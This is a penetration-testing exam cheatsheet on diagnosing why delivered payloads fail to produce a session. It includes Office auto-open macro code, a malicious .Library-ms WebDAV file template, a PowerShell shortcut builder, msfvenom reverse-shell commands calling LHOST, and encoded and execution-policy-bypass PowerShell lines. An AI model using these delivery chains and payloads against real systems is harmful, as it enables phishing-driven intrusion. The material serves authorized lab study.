    10.7 Payload Execution Obstacles Cheatsheet

    Payload delivered but no session?

    Find the last verified state in the delivery-to-session chain.

    Start the first checks →
    Have a specific failure?

    Use runtime, parser and security-control evidence to select the next test.

    Follow the finding →

    ← Cheatsheet index | Full procedure | Shells and payloads | Pivoting | Strategy map | Study methods: Resolve payload execution obstacles

    10.7.1 Record your current identity, access and reachable resources State ladder

     
    delivery → trigger → parser/loader → execution → connection → handler → session

    Preserve the last confirmed state. Change only the next failed boundary.

    EvidenceNext question
    File/request arrivedDid the intended consumer open/parse it?
    User/service triggered itDid a harmless command execute?
    Marker/process existsCan that context reach the listener?
    TCP connection arrivedDoes the handler match the payload?
    Session openedWhat host, identity, architecture and privilege?

    10.7.2 Establish the current state and choose your first useful check First-pass triage

    Run/context: artifact generation and listeners belong to the testing workstation; delivery, process execution and security-control evidence must be checked on the selected host. Decide: identify the last independently verified state using the state ladder. Diagnose the failed boundary before regenerating; a callback problem belongs to session/route checks.

    1. Prove a harmless direct command.
    2. Verify final artifact path and hash.
    3. Write every parser/interpreter/loader.
    4. Match OS, process bitness, format and dependencies.
    5. Check permissions, working directory and explicit policy/control evidence.
    6. Verify listener bind and target-to-listener route.
    7. Match staged/stageless payload and handler.
    8. Repair session I/O last.

    10.7.3 Check the conditions required for a document macro to execute Office macro gates

    Use .docm or legacy .doc; .docx alone does not persist embedded VBA. Store the macro in the document.

    Harmless trigger proof:

    Sub AutoOpen()
    RunProof
End Sub

Sub Document_Open()
    RunProof
End Sub

Sub RunProof()
    CreateObject("WScript.Shell").Run _
        "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True
End Sub

    Zone inspection:

    Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream *
Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier

    Check in order:

    format → macro saved in document → MOTW/zone → Protected View/Trust/GPO
→ required user action → Office child process → command parsing → network path

    Internet-sourced macros are commonly blocked by default. “Enable Content” is not a universal current path.

    10.7.4 Validate each delivery and execution step in the Library-file chain Windows Library file chain

     
    .Library-ms → Explorer/WebDAV → .lnk → command → optional download → callback

    WsgiDAV, when already installed:

    mkdir -p webdav
wsgidav --host=0.0.0.0 --port=80 \
  --root=./webdav --auth=anonymous

    Port 80 is the plain-HTTP Windows WebDAV baseline. An alternate port needs target-side WebClient and route validation.

    Minimal library definition:

    <?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1002</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation><url>http://LHOST/</url></simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

    Controlled shortcut creation:

    $shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut('C:\PATH\webdav\ACTION.lnk')
$shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"
$shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt'
$shortcut.WorkingDirectory = $env:TEMP
$shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
$shortcut.Save()
    ObservationCheck next
    Empty libraryWebDAV bind/route/WebClient/policy/serialized state
    No WebDAV requestUser action, URL, route or blocked DAV
    Directory visible; no commandSecond user action or shortcut control
    Marker exists; no downloadQuoting, DNS or delivery-server route
    Download exists; no callbackFormat/control/handler/return route

    10.7.7 Locate the parser layer that changes your PowerShell command PowerShell quoting

     
    $command = 'COMMAND'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))

    powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE

    UTF-16LE Base64 solves a transport/quoting problem. It is not encryption or an AV bypass.

    powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1

    This does not disable AMSI, Defender, AppLocker/WDAC, permissions or GPO.

    10.7.9 Generate a payload that matches the platform, consumer and connection path msfvenom

     
    msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'

msfvenom -p PAYLOAD_NAME --list-options

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe
file shell.elf shell.exe
sha256sum shell.elf shell.exe

    Existing-PoC constraints only:

    msfvenom -p PAYLOAD_NAME LHOST=LHOST LPORT=LPORT \
  EXITFUNC=thread -f FORMAT -v VARIABLE \
  -b 'BAD_CHARACTERS' -s MAX_SPACE

    shell_reverse_tcp = stageless/single
shell/reverse_tcp = staged; exact framework handler required

    Encoders address representation/bad-character needs; they do not guarantee AV evasion.

    10.7.11 Validate module prerequisites and observe the current exam limits Restricted Metasploit module workflow

     
    search type:exploit cve:CVE_ID

    Exam boundary:

    • msfvenom and multi/handler are the across-target exceptions, but Meterpreter remains one-target limited.
    • Auxiliary, Exploit or Post modules—or Meterpreter—lock Metasploit to one chosen target even when check or an attempt fails.
    • Metasploit pivoting and automatic exploitation are prohibited.
    • Module rank is stability guidance, not vulnerability proof.

    10.7.12 Packet/session interpretation

     
    sudo tcpdump -ni any tcp port LPORT
    EvidenceNext action
    No SYNRepair execution, LHOST, route or egress
    SYN, no replyCorrect listener bind/local firewall
    Handshake then closeMatch payload/handler; inspect crash/control
    Stable TCP, no commandsCheck staged/raw mismatch and I/O
    Session opens then diesParent lifetime, EXITFUNC, crash or control

    10.7.14 Discover and recognize candidates

    Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.

    10.7.14.1 Resolve payload execution obstacles

    10.7.14.1.1 Find: Use a gated Office macro delivery chain

    From the assigned client-side scenario identify the actual Office consumer, required open/enable interaction and file-origin policy before investigating callbacks.

    Get-Item .\FILE -Stream *
Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue

    Recognize: Internet-origin metadata and absent macro execution localize an earlier gate than network connectivity.

    Validate next: Check compatible Office, actual macro/user trigger and applicable policy; a delivered/opened document is not execution.

    Use a gated Office macro delivery chain.

    10.7.14.1.2 Find: Use a Windows Library/WebDAV/shortcut chain with explicit interaction

    Inspect the actual Library XML, remote resource and shortcut properties from the assigned delivery scenario; distinguish browsing from launching.

    Get-Content .\FILE.library-ms
Test-NetConnection LHOST -Port PORT

    Recognize: The resource can be presented while the executable user interaction is still absent.

    Validate next: Verify compatible WebDAV/Library handling, actual shortcut target/launch, policy and its command effect.

    Use a Windows Library/WebDAV/shortcut chain with explicit interaction.

    10.7.14.1.3 Commands and use-case variants

    Need: A recorded delivery/execution chain with the expected consumer and effect. Compatible Windows consumer, reachable WebDAV resource, correctly handled shortcut and required user launch; policy permits the action

    A .Library-ms file is an XML library description that can present a remote location in Explorer. The PEN-200 attack pattern is two-stage:

    delivered .Library-ms
→ user opens library
→ Explorer reaches WebDAV location
→ user opens .lnk
→ shortcut launches chosen command
→ optional download/callback

    If WsgiDAV is already installed, publish a dedicated authorized-lab directory:

    mkdir -p webdav
wsgidav --host=0.0.0.0 --port=80 \
  --root=./webdav --auth=anonymous

    Anonymous mode exposes the selected directory. Bind only to the required lab interface when possible, place no sensitive files there and stop the server after the exercise. Port 80 is the reliable baseline for a plain-HTTP Windows WebDAV location. Use another port only after confirming the target WebClient accepts that URL form and the route permits it.

    Original library template using placeholders:

    <?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>1</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1002</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://LHOST/</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>

    Save it with a .Library-ms extension. Windows may add a serialized location after opening it; retain a clean source copy and inspect the final artifact before delivery.

    Create a shortcut on a controlled Windows preparation host:

    $shortcutPath = 'C:\PATH\webdav\ACTION.lnk'
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe"
$shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt'
$shortcut.WorkingDirectory = $env:TEMP
$shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11"
$shortcut.Save()

    Only after the harmless marker works, substitute a command compatible with the target and the separately proven callback route. Diagnose this chain at three independent network points:

    Explorer → WebDAV
shortcut command → optional payload/download server
executed payload → listener/handler

    Failure cues:

    ObservationNext boundary
    Library opens emptyWebDAV bind, reachability, WebClient/policy, modified library serialization
    WebDAV receives nothingArtifact not opened, URL/port wrong, client route or WebDAV blocked
    Directory appears; shortcut never runsRequired second user action absent or shortcut blocked
    Marker works; download absentCommand quoting, DNS and payload-server route
    Download occurs; no executionFormat, permissions, policy, quarantine or dependency
    Execution proven; no callbackListener, route, payload/handler compatibility

    Verify: Verify the launched command's identity/effect and distinguish WebDAV requests from execution.

    If it fails: Unavailable WebDAV client, blocked remote path, missing shortcut interaction or policy can stop the chain before a callback.

    10.7.14.1.4 Find: Match an artifact to its executable consumer and runtime

    Inspect a transferred/generated artifact's bytes, executable format and required consumer/loader before interpreting runtime errors.

    file FILE
sha256sum FILE
readelf -l FILE 2>/dev/null
uname -m

    Recognize: An existing file can fail because its loader/runtime is missing; this is separate from callback failure.

    Validate next: Verify exact architecture, loader/runtime, permissions, mount policy, line endings and integrity.

    Match an artifact to its executable consumer and runtime.

    10.7.14.1.5 Commands and use-case variants

    Need: A recorded delivery/execution chain with the expected consumer and effect. Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format

    The file extension is not the execution contract. Record all of these:

    target OS and build
target process architecture
artifact format
loader/interpreter
execution identity and integrity
working directory and PATH
required runtime/libraries
arguments and quoting
network direction

    10.7.14.1.5.1 Check whether the artifact can execute in the Linux environment Linux checks
    uname -a
uname -m
file PAYLOAD
readelf -h PAYLOAD | sed -n '1,25p'
ldd PAYLOAD
ls -l PAYLOAD
findmnt -T /PATH/TO/PAYLOAD
head -n 1 SCRIPT

    Common interpretations:

    • Exec format error: wrong format/architecture or invalid interpreter line;
    • Permission denied: missing execute permission, inaccessible parent directory, noexec, policy or identity issue;
    • No such file or directory when the file exists: missing dynamic loader or broken shebang interpreter;
    • missing shared object: runtime library mismatch;
    • ^M in a shebang: CRLF line endings changed the interpreter path;

    ConsumerRequired property / common failure

    If it fails: Permission, mount policy, CRLF/shebang, missing runtime and architecture mismatches require different fixes.

    10.7.14.1.7 Commands and use-case variants

    Need: A recorded delivery/execution chain with the expected consumer and effect. Known outer request/template/database parser and inner shell; correct character encoding and transport length

    Write the real chain:

    document/shortcut or HTTP/SQL/template input
→ application parser
→ VBA/WScript/application runtime
→ cmd.exe /c, /bin/sh -c or PowerShell
→ final command/payload

    Start with a short marker at every layer. Check:

    • quote ownership at each layer;
    • expansion of %VAR%, $VAR and PowerShell variables;
    • metacharacters such as &, |, <, >, ;, backticks and parentheses;
    • URL/JSON/XML/Base64 decode count;
    • command-line, VBA-string, request-field or exploit-buffer length;
    • current directory and relative paths.

    PowerShell encoded-command preparation:

    $command = 'COMMAND'
$bytes = [Text.Encoding]::Unicode.GetBytes($command)
[Convert]::ToBase64String($bytes)

    powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE

    -EncodedCommand uses UTF-16LE. It solves some transport/quoting problems; it is not encryption and does not establish antimalware evasion.

    Write the parser chain explicitly:

    HTTP/SQL/template parser
→ application language
→ command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell)
→ target shell/interpreter
→ payload command

    Test each layer with a small command. Encode only for the layer that consumes the characters:

    python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))'

    Typical failures:

    • &, |, >, <, $, backticks, quotes or spaces consumed by an outer shell;
    • URL decoding occurs zero, one or two times;
    • JSON, XML, SQL or template quoting changes the command;
    • PowerShell receives UTF-8 Base64 instead of required UTF-16LE;
    • payload length exceeds a field, command line or exploit buffer;
    • 32-bit payload is injected into a 64-bit context or the reverse.

    Verify: Verify received/executed command behavior at each parser boundary with small discriminating tests.

    If it fails: Truncation, double decoding or mismatched shell syntax should not be treated as missing network connectivity.

    Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore:

    • changing a filename does not imply a new payload;
    • Base64 does not imply concealment from AMSI;
    • an in-memory technique is not automatically invisible;
    • an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass;
    • a clean third-party scanner result does not prove execution on the target and may disclose a private sample.

    Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun.

  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled

    Do not label every failure “AV.” Differentiate:

    • file never arrived or hashes differ;
    • file arrived and disappeared/quarantined;
    • process creation was denied;
    • script content was blocked;
    • process started and exited/crashed;
    • callback was blocked after execution;
    • application-control or language-mode restrictions;
    • ordinary format, architecture, permission or dependency errors.

    Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit.

    For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with payload execution obstacles.
